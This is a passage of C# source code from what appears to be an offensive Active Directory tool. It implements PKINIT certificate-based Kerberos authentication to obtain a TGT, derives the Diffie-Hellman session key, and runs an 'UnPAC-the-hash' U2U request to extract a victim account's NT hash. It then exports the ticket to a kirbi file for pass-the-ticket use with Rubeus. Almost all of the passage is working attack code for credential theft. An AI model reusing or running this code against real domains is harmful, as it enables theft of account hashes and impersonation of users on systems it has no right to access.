            byte[] signerInfo = BuildPkinitSignerInfo(cert, signature);
            signedData.AddRange(BuildSet(signerInfo));

            return BuildSequence(signedData.ToArray());
        }


        private static byte[] BuildPkinitSignerInfo(X509Certificate2 cert, byte[] signature)
        {
            // SignerInfo ::= SEQUENCE {
            //   version CMSVersion,
            //   sid SignerIdentifier,
            //   digestAlgorithm DigestAlgorithmIdentifier,
            //   signedAttrs [0] IMPLICIT SignedAttributes OPTIONAL,
            //   signatureAlgorithm SignatureAlgorithmIdentifier,
            //   signature SignatureValue
            // }

            List<byte> signerInfo = new List<byte>();

            // version INTEGER (1)
            signerInfo.AddRange(BuildInteger(1));

            // sid - IssuerAndSerialNumber
            byte[] issuerDN = cert.IssuerName.RawData;
            byte[] serialNumber = cert.GetSerialNumber();
            Array.Reverse(serialNumber); // to big-endian

            // Build INTEGER for serial number
            List<byte> serialIntBytes = new List<byte>();
            int start = 0;
            while (start < serialNumber.Length - 1 && serialNumber[start] == 0) start++;
            bool needsPadding = (serialNumber[start] & 0x80) != 0;
            int serialLen = serialNumber.Length - start + (needsPadding ? 1 : 0);

            serialIntBytes.Add(0x02);
            serialIntBytes.AddRange(EncodeLength(serialLen));
            if (needsPadding) serialIntBytes.Add(0x00);
            for (int i = start; i < serialNumber.Length; i++)
                serialIntBytes.Add(serialNumber[i]);

            List<byte> issuerAndSerial = new List<byte>();
            issuerAndSerial.AddRange(issuerDN);
            issuerAndSerial.AddRange(serialIntBytes);
            signerInfo.AddRange(BuildSequence(issuerAndSerial.ToArray()));

            // digestAlgorithm - SHA-1
            byte[] sha1Oid = new byte[] { 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A };
            signerInfo.AddRange(BuildSequence(sha1Oid));

            // signatureAlgorithm - sha1WithRSAEncryption (1.2.840.113549.1.1.5)
            byte[] rsaSha1Oid = new byte[] { 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05 };
            signerInfo.AddRange(BuildSequence(rsaSha1Oid));

            // signature OCTET STRING
            signerInfo.AddRange(BuildOctetString(signature));

            return BuildSequence(signerInfo.ToArray());
        }

        private static byte[] BuildSignedDataManual(X509Certificate2 cert, byte[] content)
        {
            // Manual CMS SignedData construction as fallback
            try
            {
                using (RSA rsa = cert.GetRSAPrivateKey())
                {
                    if (rsa == null)
                        throw new Exception("No RSA private key available");

                    byte[] signature = rsa.SignData(content, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

                    List<byte> signedData = new List<byte>();

                    // version (INTEGER 1)
                    signedData.AddRange(BuildInteger(1));

                    // digestAlgorithms SET OF AlgorithmIdentifier
                    byte[] sha256AlgId = BuildSequence(new byte[] { 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00 });
                    signedData.AddRange(BuildSet(sha256AlgId));

                    // encapContentInfo
                    byte[] eContentType = new byte[] { 0x06, 0x0B, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x10, 0x01, 0x09 };
                    byte[] eContent = BuildContextTag(0, BuildOctetString(content));
                    signedData.AddRange(BuildSequence(Combine(eContentType, eContent)));

                    // certificates [0] IMPLICIT CertificateSet
                    byte[] certSet = new byte[] { 0xA0 };
                    byte[] certBytes = cert.RawData;
                    signedData.AddRange(certSet);
                    signedData.AddRange(EncodeLength(certBytes.Length));
                    signedData.AddRange(certBytes);

                    // signerInfos
                    byte[] signerInfo = BuildSignerInfoManual(cert, signature);
                    signedData.AddRange(BuildSet(signerInfo));

                    return BuildSequence(signedData.ToArray());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Manual SignedData construction failed: {ex.Message}");
                return content;
            }
        }

        private static byte[] Combine(params byte[][] arrays)
        {
            int totalLength = arrays.Sum(a => a.Length);
            byte[] result = new byte[totalLength];
            int offset = 0;
            foreach (byte[] array in arrays)
            {
                Buffer.BlockCopy(array, 0, result, offset, array.Length);
                offset += array.Length;
            }
            return result;
        }

        private static byte[] BuildSignerInfoManual(X509Certificate2 cert, byte[] signature)
        {
            List<byte> signerInfo = new List<byte>();

            // version
            signerInfo.AddRange(BuildInteger(1));

            // sid - IssuerAndSerialNumber
            byte[] issuerDN = cert.IssuerName.RawData;
            byte[] serialNumber = cert.GetSerialNumber();
            Array.Reverse(serialNumber); // Convert to big-endian
            byte[] serial = new byte[serialNumber.Length + 2];
            serial[0] = 0x02; // INTEGER tag
            serial[1] = (byte)serialNumber.Length;
            Buffer.BlockCopy(serialNumber, 0, serial, 2, serialNumber.Length);

            List<byte> issuerAndSerial = new List<byte>();
            issuerAndSerial.AddRange(issuerDN);
            issuerAndSerial.AddRange(serial);
            signerInfo.AddRange(BuildSequence(issuerAndSerial.ToArray()));

            // digestAlgorithm
            byte[] sha256AlgId = BuildSequence(new byte[] { 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00 });
            signerInfo.AddRange(sha256AlgId);

            // signatureAlgorithm (sha256WithRSAEncryption)
            byte[] rsaSha256AlgId = BuildSequence(new byte[] { 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00 });
            signerInfo.AddRange(rsaSha256AlgId);

            // signature
            signerInfo.AddRange(BuildOctetString(signature));

            return BuildSequence(signerInfo.ToArray());
        }

        private static byte[] BuildReqBody(string user, string realm)
        {
            List<byte> reqBody = new List<byte>();

            // kdc-options [0] KDCOptions
            byte[] kdcOptions = new byte[] { 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10 }; // forwardable, renewable, canonicalize
            reqBody.AddRange(BuildContextTag(0, kdcOptions));

            // cname [1] PrincipalName
            byte[] cname = BuildPrincipalName(1, user); // NT-PRINCIPAL
            reqBody.AddRange(BuildContextTag(1, cname));

            // realm [2] Realm
            reqBody.AddRange(BuildContextTag(2, BuildGeneralString(realm)));

            // sname [3] PrincipalName (krbtgt/REALM)
            byte[] sname = BuildPrincipalName(2, "krbtgt", realm); // NT-SRV-INST
            reqBody.AddRange(BuildContextTag(3, sname));

            // till [5] KerberosTime
            string till = DateTime.UtcNow.AddDays(1).ToString("yyyyMMddHHmmss") + "Z";
            reqBody.AddRange(BuildContextTag(5, BuildGeneralizedTime(till)));

            // nonce [7] UInt32
            int nonce = new Random().Next(100000000, 999999999);
            reqBody.AddRange(BuildContextTag(7, BuildInteger(nonce)));

            // etype [8] SEQUENCE OF Int32
            byte[] etypes = BuildSequence(
                BuildInteger(ETYPE_AES256_CTS_HMAC_SHA1),
                BuildInteger(ETYPE_AES128_CTS_HMAC_SHA1),
                BuildInteger(ETYPE_RC4_HMAC)
            );
            reqBody.AddRange(BuildContextTag(8, etypes));

            return BuildSequence(reqBody.ToArray());
        }

        private static byte[] BuildPrincipalName(int nameType, params string[] names)
        {
            List<byte> principal = new List<byte>();

            // name-type [0] Int32
            principal.AddRange(BuildContextTag(0, BuildInteger(nameType)));

            // name-string [1] SEQUENCE OF GeneralString
            List<byte> nameStrings = new List<byte>();
            foreach (string name in names)
            {
                nameStrings.AddRange(BuildGeneralString(name));
            }
            principal.AddRange(BuildContextTag(1, BuildSequence(nameStrings.ToArray())));

            return BuildSequence(principal.ToArray());
        }

        private static byte[] SendToKdc(string kdc, int port, byte[] data)
        {
            try
            {
                OutputHelper.Verbose($"[*] Connecting to {kdc}:{port}...");

                using (TcpClient client = new TcpClient())
                {
                    client.SendTimeout = 10000;
                    client.ReceiveTimeout = 10000;
                    client.Connect(kdc, port);

                    OutputHelper.Verbose($"[+] Connected to KDC");

                    using (NetworkStream stream = client.GetStream())
                    {
                        stream.ReadTimeout = 10000;
                        stream.WriteTimeout = 10000;

                        // Kerberos TCP requires 4-byte length prefix (big-endian)
                        byte[] lengthPrefix = BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder(data.Length));
                        OutputHelper.Verbose($"[*] Sending {data.Length} bytes...");
                        stream.Write(lengthPrefix, 0, 4);
                        stream.Write(data, 0, data.Length);
                        stream.Flush();
                        OutputHelper.Verbose($"[+] Data sent");

                        // Read response length
                        OutputHelper.Verbose($"[*] Waiting for response...");
                        byte[] respLengthBytes = new byte[4];
                        int read = 0;
                        int attempts = 0;
                        while (read < 4 && attempts < 50)
                        {
                            if (stream.DataAvailable)
                            {
                                read += stream.Read(respLengthBytes, read, 4 - read);
                            }
                            else
                            {
                                System.Threading.Thread.Sleep(100);
                                attempts++;
                            }
                        }

                        if (read < 4)
                        {
                            Console.WriteLine($"[!] Only received {read} bytes of length prefix");
                            return null;
                        }

                        int respLength = System.Net.IPAddress.NetworkToHostOrder(BitConverter.ToInt32(respLengthBytes, 0));
                        OutputHelper.Verbose($"[*] Response length: {respLength} bytes");

                        if (respLength <= 0 || respLength > 100000)
                        {
                            Console.WriteLine($"[!] Invalid response length: {respLength}");
                            return null;
                        }

                        // Read response
                        byte[] response = new byte[respLength];
                        int totalRead = 0;
                        while (totalRead < respLength)
                        {
                            read = stream.Read(response, totalRead, respLength - totalRead);
                            if (read == 0) break;
                            totalRead += read;
                        }

                        return response;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error connecting to KDC: {ex.Message}");
                return null;
            }
        }

        private static void ParseKdcResponse(byte[] response, X509Certificate2 cert, string user, string domain, bool showCredentials)
        {
            if (response == null || response.Length < 5)
            {
                Console.WriteLine("[!] Invalid response");
                return;
            }

            // Save raw AS-REP for kirbi conversion later
            string kirbiPath = $"{user}_{DateTime.Now:yyyyMMdd_HHmmss}.kirbi";
            OutputHelper.Verbose($"[*] Saving raw AS-REP to: {kirbiPath}");

            // Check message type
            // APPLICATION tag is at the start
            int msgType = response[0] & 0x1F;

            if (msgType == KRB_ERROR || (response[0] == 0x7E)) // KRB-ERROR
            {
                Console.WriteLine("[!] KDC returned an error");
                ParseKrbError(response);
                return;
            }

            if (msgType == KRB_AS_REP || response[0] == 0x6B) // AS-REP
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] TGT obtained successfully!");
                Console.ResetColor();

                // Extract and display TGT info
                ExtractTgtInfo(response, user, domain);

                // Try to process PKINIT AS-REP and derive session key
                try
                {
                    ProcessPkinitAsRep(response, cert, user, domain, showCredentials);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error processing PKINIT AS-REP: {ex.Message}");
                    if (showCredentials)
                    {
                        OutputHelper.Verbose("[*] For full credential extraction, use Rubeus with the PFX file.");
                    }
                }
            }
            else
            {
                Console.WriteLine($"[!] Unknown response type: 0x{response[0]:X2}");
                OutputHelper.Verbose($"[*] First 32 bytes: {BitConverter.ToString(response.Take(32).ToArray())}");
            }
        }

        private static void ProcessPkinitAsRep(byte[] response, X509Certificate2 cert, string user, string domain, bool showCredentials)
        {
            OutputHelper.Verbose("\n[*] Processing PKINIT AS-REP to derive session key...");

            // Save raw AS-REP for debugging
            SaveAsRepToFile(response, user);

            // Parse AS-REP structure to find padata
            // AS-REP ::= [APPLICATION 11] KDC-REP
            // KDC-REP ::= SEQUENCE {
            //   pvno            [0] INTEGER (5),
            //   msg-type        [1] INTEGER (11),
            //   padata          [2] SEQUENCE OF PA-DATA OPTIONAL,
            //   crealm          [3] Realm,
            //   cname           [4] PrincipalName,
            //   ticket          [5] Ticket,
            //   enc-part        [6] EncryptedData
            // }

            int offset = 0;

            // Skip APPLICATION 11 tag
            if (response[offset] == 0x6B)
            {
                offset++;
                int len;
                offset += DecodeLength(response, offset, out len);
                OutputHelper.Verbose($"[*] AS-REP APPLICATION tag found, inner length: {len}");
            }

            // Skip outer SEQUENCE
            if (response[offset] == 0x30)
            {
                offset++;
                int len;
                offset += DecodeLength(response, offset, out len);
                OutputHelper.Verbose($"[*] Inner SEQUENCE at offset {offset}, length: {len}");
            }

            // Find padata [2]
            int padataOffset = -1;
            int padataEnd = -1;
            int searchEnd = Math.Min(offset + 500, response.Length - 10);

            for (int i = offset; i < searchEnd; i++)
            {
                // padata is tagged as [2] in AS-REP (context tag 0xA2)
                if (response[i] == 0xA2)
                {
                    int tagOffset = i + 1;
                    int padataLen;
                    int lenBytes = DecodeLength(response, tagOffset, out padataLen);
                    padataOffset = tagOffset + lenBytes;
                    padataEnd = padataOffset + padataLen;
                    OutputHelper.Verbose($"[+] Found padata at offset {i}");
                    break;
                }
            }

            if (padataOffset < 0)
            {
                OutputHelper.Verbose("[!] Could not find padata in AS-REP");
                return;
            }

            // Parse padata SEQUENCE OF PA-DATA to find PA-PK-AS-REP (type 17)
            // PA-DATA ::= SEQUENCE {
            //   padata-type   [1] Int32,
            //   padata-value  [2] OCTET STRING
            // }

            int paPkAsRepValueOffset = -1;
            int paPkAsRepValueLen = 0;
            int pos = padataOffset;

            // Skip outer SEQUENCE tag if present
            if (response[pos] == 0x30)
            {
                pos++;
                int seqLen;
                pos += DecodeLength(response, pos, out seqLen);
            }

            while (pos < padataEnd - 5)
            {
                // Each PA-DATA is a SEQUENCE
                if (response[pos] != 0x30)
                {
                    pos++;
                    continue;
                }

                int paDataStart = pos;
                pos++; // Skip SEQUENCE tag
                int paDataLen;
                pos += DecodeLength(response, pos, out paDataLen);
                int paDataContentEnd = pos + paDataLen;

                // Find padata-type [1]
                int padataType = -1;
                int valueOffset = -1;
                int valueLen = 0;

                while (pos < paDataContentEnd)
                {
                    byte tag = response[pos];
                    if (tag == 0xA1) // padata-type [1]
                    {
                        pos++;
                        int ctxLen;
                        pos += DecodeLength(response, pos, out ctxLen);
                        // Should be INTEGER
                        if (response[pos] == 0x02)
                        {
                            pos++;
                            int intLen = response[pos++];
                            padataType = 0;
                            for (int i = 0; i < intLen; i++)
                                padataType = (padataType << 8) | response[pos++];
                        }
                    }
                    else if (tag == 0xA2) // padata-value [2]
                    {
                        pos++;
                        int ctxLen;
                        pos += DecodeLength(response, pos, out ctxLen);
                        // Should be OCTET STRING
                        if (response[pos] == 0x04)
                        {
                            pos++;
                            pos += DecodeLength(response, pos, out valueLen);
                            valueOffset = pos;
                            pos += valueLen;
                        }
                        else
                        {
                            valueOffset = pos;
                            valueLen = ctxLen;
                            pos += ctxLen;
                        }
                    }
                    else
                    {
                        pos++;
                        if (pos < paDataContentEnd)
                        {
                            int skipLen;
                            pos += DecodeLength(response, pos, out skipLen);
                            pos += skipLen;
                        }
                    }
                }

                OutputHelper.Verbose($"[*] Found PA-DATA type {padataType}");

                if (padataType == PA_PK_AS_REP) // 17
                {
                    paPkAsRepValueOffset = valueOffset;
                    paPkAsRepValueLen = valueLen;
                    OutputHelper.Verbose($"[+] Found PA-PK-AS-REP");
                    break;
                }

                pos = paDataContentEnd;
            }

            if (paPkAsRepValueOffset < 0)
            {
                OutputHelper.Verbose("[!] Could not find PA-PK-AS-REP in padata");
                // Try alternative search - look for pattern in entire response
                paPkAsRepValueOffset = FindPaPkAsRepAlternative(response);
                if (paPkAsRepValueOffset < 0)
                {
                    return;
                }
            }

            // Extract KDC's DH public key from PA-PK-AS-REP
            // PA-PK-AS-REP contains either dhInfo or encKeyPack
            byte[] kdcDhPublicKey = ExtractKdcDhPublicKeyFromPaPkAsRep(response, paPkAsRepValueOffset);
            if (kdcDhPublicKey == null || kdcDhPublicKey.Length == 0)
            {
                OutputHelper.Verbose("[!] Could not extract KDC DH public key");
                OutputHelper.Verbose("[*] Trying fallback extraction...");
                kdcDhPublicKey = ExtractKdcDhPublicKey(response, 0);
            }

            if (kdcDhPublicKey == null || kdcDhPublicKey.Length == 0)
            {
                Console.WriteLine("[!] Could not extract KDC DH public key");
                return;
            }

            OutputHelper.Verbose($"[+] Extracted KDC DH public key ({kdcDhPublicKey.Length} bytes)");

            // Extract server DH nonce from PA-PK-AS-REP (needed for key derivation)
            _serverDhNonce = ExtractServerDhNonce(response, paPkAsRepValueOffset);

            // Calculate DH shared secret: (KDC_public_key)^(our_private_key) mod p
            var p = new System.Numerics.BigInteger(DH_P_MODP2.AsEnumerable().Reverse().Concat(new byte[] { 0 }).ToArray());
            var y = new System.Numerics.BigInteger(kdcDhPublicKey.AsEnumerable().Reverse().Concat(new byte[] { 0 }).ToArray());
            var x = new System.Numerics.BigInteger(_dhPrivateKey.AsEnumerable().Reverse().Concat(new byte[] { 0 }).ToArray());

            var sharedSecret = System.Numerics.BigInteger.ModPow(y, x, p);

            byte[] sharedSecretBytes = sharedSecret.ToByteArray();
            Array.Reverse(sharedSecretBytes);
            // Remove leading zeros
            int start = 0;
            while (start < sharedSecretBytes.Length - 1 && sharedSecretBytes[start] == 0) start++;
            if (start > 0)
            {
                byte[] trimmed = new byte[sharedSecretBytes.Length - start];
                Array.Copy(sharedSecretBytes, start, trimmed, 0, trimmed.Length);
                sharedSecretBytes = trimmed;
            }

            OutputHelper.Verbose($"[+] DH shared secret computed ({sharedSecretBytes.Length} bytes)");

            // Derive session key from shared secret using RFC 4556 kTruncate
            byte[] sessionKey = DeriveSessionKey(sharedSecretBytes, 32);
            _dhReplyKey = sessionKey; // Save for PAC_CREDENTIAL_INFO decryption
            OutputHelper.Verbose($"[+] Session key derived ({sessionKey.Length} bytes)");

            // UnPAC-the-hash: Extract credentials via U2U TGS request
            if (showCredentials)
            {
                _ntHashExtracted = false; // Reset flag
                try
                {
                    // First try to extract from AS-REP directly (if PA-PAC-CREDENTIALS present)
                    UnpacTheHash.ExtractCredentials(response, sessionKey, UnpacTheHash.KERB_ETYPE.aes256_cts_hmac_sha1);

                    // If that didn't get the hash, we need U2U TGS-REQ
                    if (!_ntHashExtracted)
                    {
                        OutputHelper.Verbose("\n[*] Attempting U2U TGS-REQ to extract NT hash...");

                        // Extract ticket from AS-REP for U2U
                        byte[] ticket = ExtractTicketFromAsRep(response);
                        if (ticket != null && ticket.Length > 0)
                        {
                            // Get the actual session key from the decrypted enc-part
                            byte[] actualSessionKey = ExtractActualSessionKey(response, sessionKey);
                            if (actualSessionKey != null)
                            {
                                // Store actual session key for later export
                                _actualSessionKey = actualSessionKey;

                                // Get KDC host from _lastKdcHost or resolve again
                                string kdc = _lastKdcHost ?? GetKDC(domain);
                                PerformU2UTgsRequest(kdc, user, domain, ticket, actualSessionKey);
                            }
                            else
                            {
                                OutputHelper.Verbose("[!] Could not extract actual session key for U2U");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] UnPAC-the-hash error: {ex.Message}");
                }

                // Show error if NT hash was not extracted
                if (!_ntHashExtracted)
                {
                    Console.WriteLine("\n[!] Unable to extract NT hash (UnPAC-the-hash failed)");
                    Console.WriteLine("[!] Possible causes:");
                    Console.WriteLine("    - Certificate/ticket may be corrupted or invalid");
                    Console.WriteLine("    - KDC may not support PKINIT or U2U");
                    Console.WriteLine("    - PAC_CREDENTIAL_INFO not present in ticket");
                    Console.WriteLine("[*] The TGT may still be valid for authentication");
                }
            }

            // Get the actual session key from EncASRepPart (not the DH reply key!)
            byte[] exportSessionKey = _actualSessionKey ?? ExtractActualSessionKey(response, sessionKey) ?? sessionKey;

            // Export the TGT to kirbi and base64 format
            if (ImportTgtToCache(response, exportSessionKey, user, domain))
            {
                
                OutputHelper.Verbose("[*] Use Rubeus.exe ptt to import the ticket in your target session");
            }
        }

        private static int DecodeLength(byte[] data, int offset, out int length)
        {
            if ((data[offset] & 0x80) == 0)
            {
                length = data[offset];
                return 1;
            }
            else
            {
                int numBytes = data[offset] & 0x7F;
                length = 0;
                for (int i = 1; i <= numBytes && offset + i < data.Length; i++)
                {
                    length = (length << 8) | data[offset + i];
                }
                return 1 + numBytes;
            }
        }

        private static int FindPaPkAsRepAlternative(byte[] response)
        {
            // Alternative search - look for CMS SignedData OID after padata-type 17
            // Pattern: A1 03 02 01 11 A2 (padata-type [1] INT 17, padata-value [2])
            for (int i = 0; i < response.Length - 10; i++)
            {
                if (response[i] == 0xA1 &&
                    response[i + 1] == 0x03 &&
                    response[i + 2] == 0x02 &&
                    response[i + 3] == 0x01 &&
                    response[i + 4] == 0x11 && // padata-type = 17
                    response[i + 5] == 0xA2)   // padata-value tag
                {
                    int valueTagOffset = i + 5;
                    int len;
                    int lenBytes = DecodeLength(response, valueTagOffset + 1, out len);
                    int octetStringOffset = valueTagOffset + 1 + lenBytes;

                    // Skip OCTET STRING tag if present
                    if (response[octetStringOffset] == 0x04)
                    {
                        octetStringOffset++;
                        octetStringOffset += DecodeLength(response, octetStringOffset, out len);
                    }

                    OutputHelper.Verbose($"[+] Found PA-PK-AS-REP via alternative search at offset {octetStringOffset}");
                    return octetStringOffset;
                }
            }
            return -1;
        }

        private static byte[] ExtractKdcDhPublicKeyFromPaPkAsRep(byte[] data, int offset)
        {
            // PA-PK-AS-REP ::= CHOICE {
            //   dhInfo          [0] DHRepInfo,
            //   encKeyPack      [1] IMPLICIT OCTET STRING
            // }
            // DHRepInfo ::= SEQUENCE {
            //   dhSignedData    [0] IMPLICIT OCTET STRING (ContentInfo)
            //   serverDHNonce   [1] DHNonce OPTIONAL
            // }

            OutputHelper.Verbose($"[*] Parsing PA-PK-AS-REP at offset {offset}");
            OutputHelper.Verbose($"[*] First bytes: {BitConverter.ToString(data.Skip(offset).Take(32).ToArray())}");

            // Look for a SEQUENCE (dhInfo) or context tag [0]
            int pos = offset;

            // Skip SEQUENCE if present (PA-PK-AS-REP wrapper)
            if (data[pos] == 0x30)
            {
                pos++;
                int len;
                pos += DecodeLength(data, pos, out len);
            }

            // Look for dhInfo [0]
            if (data[pos] == 0xA0 || data[pos] == 0x80)
            {
                pos++;
                int dhInfoLen;
                pos += DecodeLength(data, pos, out dhInfoLen);
                OutputHelper.Verbose($"[*] Found dhInfo at {pos}, length {dhInfoLen}");
            }

            // Now we should be at the CMS ContentInfo (SignedData)
            // ContentInfo ::= SEQUENCE { contentType OID, content [0] EXPLICIT ANY }
            // Skip to find the actual KdcDHKeyInfo

            // Look for SubjectPublicKeyInfo which contains the DH public key
            // Search for dhpublicnumber OID: 1.2.840.10046.2.1 = 2A 86 48 CE 3E 02 01
            byte[] dhOidPattern = new byte[] { 0x2A, 0x86, 0x48, 0xCE, 0x3E, 0x02, 0x01 };

            for (int i = pos; i < Math.Min(pos + 2000, data.Length - dhOidPattern.Length - 150); i++)
            {
                bool found = true;
                for (int j = 0; j < dhOidPattern.Length; j++)
                {
                    if (data[i + j] != dhOidPattern[j])
                    {
                        found = false;
                        break;
                    }
                }

                if (found)
                {
                    OutputHelper.Verbose($"[+] Found DH OID at offset {i}");
                    // The public key INTEGER should be ~150-200 bytes after the OID
                    // Search for a large INTEGER (128 bytes)
                    return ExtractKdcDhPublicKey(data, i);
                }
            }

            // Fallback: search for any large INTEGER that could be the DH public key
            return ExtractKdcDhPublicKey(data, offset);
        }

        private static int FindContextTag(byte[] data, int startOffset, byte tag)
        {
            for (int i = startOffset; i < data.Length - 1; i++)
            {
                if (data[i] == tag)
                    return i;
            }
            return -1;
        }

        private static int FindPaData(byte[] data, int startOffset, int padataType)
        {
            // Scan for PA-DATA with the specified type
            for (int i = startOffset; i < data.Length - 10; i++)
            {
                // Look for padata-type [1] INTEGER with value padataType
                if (data[i] == 0xA1 && data[i + 2] == 0x02)
                {
                    int typeValue = 0;
                    int typeLen = data[i + 3];
                    for (int j = 0; j < typeLen && j < 4; j++)
                    {
                        typeValue = (typeValue << 8) | data[i + 4 + j];
                    }
                    if (typeValue == padataType)
                    {
                        return i;
                    }
                }
            }
            return -1;
        }

        private static byte[] ExtractKdcDhPublicKey(byte[] data, int paPkAsRepOffset)
        {
            // PA-PK-AS-REP contains either dhInfo or encKeyPack
            // dhInfo [0] DHRepInfo contains:
            //   dhSignedData [0] ContentInfo (CMS SignedData)
            //   serverDHNonce [1] DHNonce OPTIONAL

            // Look for the DH public key in the dhSignedData
            // This is complex CMS parsing - we'll search for the INTEGER that represents the KDC's DH public key

            // Simple approach: search for a large INTEGER (128+ bytes) after the PA-PK-AS-REP offset
            for (int i = paPkAsRepOffset; i < data.Length - 130; i++)
            {
                // Look for INTEGER tag followed by length encoding for ~128 bytes
                if (data[i] == 0x02) // INTEGER
                {
                    int len = 0;
                    int lenBytes = 1;
                    if ((data[i + 1] & 0x80) != 0)
                    {
                        lenBytes = (data[i + 1] & 0x7F) + 1;
                        for (int j = 1; j < lenBytes; j++)
                        {
                            len = (len << 8) | data[i + 1 + j];
                        }
                    }
                    else
                    {
                        len = data[i + 1];
                    }

                    // We're looking for a ~128 byte integer (DH public key)
                    if (len >= 120 && len <= 140)
                    {
                        byte[] result = new byte[len];
                        Array.Copy(data, i + 1 + lenBytes, result, 0, len);
                        // Remove leading zero if present (sign byte)
                        if (result[0] == 0 && result.Length > 1)
                        {
                            byte[] trimmed = new byte[result.Length - 1];
                            Array.Copy(result, 1, trimmed, 0, trimmed.Length);
                            return trimmed;
                        }
                        return result;
                    }
                }
            }
            return null;
        }

        // Store server DH nonce for key derivation
        private static byte[] _serverDhNonce;

        private static byte[] DeriveSessionKey(byte[] sharedSecret, int keySize = 32)
        {
            // RFC 4556 Section 3.2.3.1 - Key Derivation for PKINIT DH
            // The key is derived as: key = kTruncate(k, x)
            // Where x = Z || client_dh_nonce || server_dh_nonce
            // Z = DH shared secret
            // Note: client_dh_nonce is typically empty (not the AS-REQ nonce!)

            OutputHelper.Verbose($"[*] Key derivation - Server DH nonce: {(_serverDhNonce != null ? $"{_serverDhNonce.Length} bytes" : "null (not sent by KDC)")}");

            // Build x = Z || server_nonce (client DH nonce is typically empty)
            // Per Rubeus implementation: client nonce is new byte[0], only server nonce is appended
            int totalLen = sharedSecret.Length + (_serverDhNonce?.Length ?? 0);
            byte[] x = new byte[totalLen];

            int offset = 0;
            Array.Copy(sharedSecret, 0, x, offset, sharedSecret.Length);
            offset += sharedSecret.Length;
            if (_serverDhNonce != null && _serverDhNonce.Length > 0)
            {
                Array.Copy(_serverDhNonce, 0, x, offset, _serverDhNonce.Length);
            }

            OutputHelper.Verbose($"[*] Key derivation input x: {x.Length} bytes (Z={sharedSecret.Length}, nonce={_serverDhNonce?.Length ?? 0})");

            // Apply kTruncate to get the final key
            return KTruncate(keySize, x);
        }

        
        /// RFC 4556 kTruncate function - derives key using iterated SHA1
        private static byte[] KTruncate(int k, byte[] x)
        {
            // kTruncate(k, x) = x' (truncated to k bytes)
            // x' is computed by iteratively hashing with a counter prefix

            byte[] result = new byte[k];
            int offset = 0;
            byte counter = 0;

            while (offset < k)
            {
                byte[] toHash = new byte[1 + x.Length];
                toHash[0] = counter;
                Array.Copy(x, 0, toHash, 1, x.Length);

                byte[] hash = ComputeSha1(toHash);

                int copyLen = Math.Min(hash.Length, k - offset);
                Array.Copy(hash, 0, result, offset, copyLen);
                offset += copyLen;
                counter++;
            }

            return result;
        }

        private static byte[] ComputeSha1(byte[] data)
        {
            using (var sha1 = SHA1.Create())
            {
                return sha1.ComputeHash(data);
            }
        }

        
        /// Extract server DH nonce from PA-PK-AS-REP
        private static byte[] ExtractServerDhNonce(byte[] response, int paPkAsRepOffset)
        {
            // PA-PK-AS-REP contains DHRepInfo:
            // DHRepInfo ::= SEQUENCE {
            //   dhSignedData    [0] IMPLICIT OCTET STRING,
            //   serverDHNonce   [1] DHNonce OPTIONAL
            // }

            OutputHelper.Verbose($"[*] Looking for server DH nonce starting at offset {paPkAsRepOffset}");

            int pos = paPkAsRepOffset;
            int endPos = Math.Min(paPkAsRepOffset + 2000, response.Length);

            // Look for context tag [1] which contains serverDHNonce
            // First we need to skip [0] (dhSignedData)
            while (pos < endPos - 5)
            {
                // Look for [0] tag (dhSignedData) first
                if (response[pos] == 0xA0 || response[pos] == 0x80)
                {
                    pos++;
                    int dhSignedDataLen;
                    pos += DecodeLength(response, pos, out dhSignedDataLen);
                    pos += dhSignedDataLen; // Skip dhSignedData content

                    // Now check for [1] tag (serverDHNonce)
                    if (pos < endPos - 3 && (response[pos] == 0xA1 || response[pos] == 0x81))
                    {
                        pos++;
                        int nonceLen;
                        pos += DecodeLength(response, pos, out nonceLen);

                        // Extract the nonce (may be wrapped in OCTET STRING)
                        if (response[pos] == 0x04)
                        {
                            pos++;
                            pos += DecodeLength(response, pos, out nonceLen);
                        }

                        byte[] nonce = new byte[nonceLen];
                        Array.Copy(response, pos, nonce, 0, nonceLen);
                        OutputHelper.Verbose($"[+] Found server DH nonce ({nonceLen} bytes): {BitConverter.ToString(nonce.Take(16).ToArray())}...");
                        return nonce;
                    }
                }
                pos++;
            }

            // Alternative search - look for 32-byte octet string after dhSignedData
            // Server DH nonce is typically 32 bytes
            pos = paPkAsRepOffset;
            while (pos < endPos - 40)
            {
                if (response[pos] == 0x04 && response[pos + 1] == 0x20) // OCTET STRING of 32 bytes
                {
                    byte[] nonce = new byte[32];
                    Array.Copy(response, pos + 2, nonce, 0, 32);
                    // Verify it looks like a nonce (not all zeros, some randomness)
                    bool hasVariation = false;
                    for (int i = 1; i < 32; i++)
                    {
                        if (nonce[i] != nonce[0]) { hasVariation = true; break; }
                    }
                    if (hasVariation && nonce.Any(b => b != 0))
                    {
                        OutputHelper.Verbose($"[+] Found potential server DH nonce at offset {pos}: {BitConverter.ToString(nonce.Take(16).ToArray())}...");
                        return nonce;
                    }
                }
                pos++;
            }

            OutputHelper.Verbose("[*] No server DH nonce found (may not be present in response)");
            return null;
        }

        
        /// Extract the actual session key from AS-REP by decrypting enc-part
        private static byte[] ExtractActualSessionKey(byte[] asRep, byte[] replyKey)
        {
            try
            {
                // Extract enc-part cipher from AS-REP
                byte[] encPart = ExtractEncPartCipher(asRep);
                if (encPart == null) return null;

                // Decrypt enc-part with reply key (key usage 3)
                byte[] decrypted = UnpacTheHash.KerberosDecrypt(
